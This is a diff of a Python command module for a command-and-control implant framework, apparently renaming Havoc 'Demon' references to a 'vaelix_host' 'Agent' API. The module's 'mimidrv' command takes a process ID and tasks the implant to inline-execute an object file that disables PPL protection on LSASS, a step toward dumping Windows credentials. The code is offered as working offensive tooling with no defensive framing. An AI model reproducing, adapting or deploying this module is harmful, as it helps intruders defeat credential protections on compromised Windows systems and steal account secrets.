@@ -1,35 +1,35 @@
-from havoc import Demon, RegisterCommand, RegisterModule
+from vaelix_host import Agent, RegisterCommand, RegisterModule
 import re
 
-def mimidrv( demonID, *params ):
+def mimidrv( agentID, *params ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer = Packer()
-    demon  = Demon( demonID )
+    agent  = Agent( agentID )
 
     num_params = len(params)
     pid = ''
 
     if num_params < 1:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough parameters" )
         return True
     elif num_params == 1:
         pid = params[ 0 ]
     elif num_params > 1:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many parameters" )
         return True
 
     try:
         pid = int( pid )
     except Exception as e:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid PID" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Invalid PID" )
         return True
 
     packer.adduint32(pid)
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to disable the PPL protection from LSASS" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, "Tasked agent to disable the PPL protection from LSASS" )
 
-    demon.InlineExecute( TaskID, "go", "dist/mimidrv.x64.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", "dist/mimidrv.x64.o", packer.getbuffer(), False )
 
     return TaskID
 
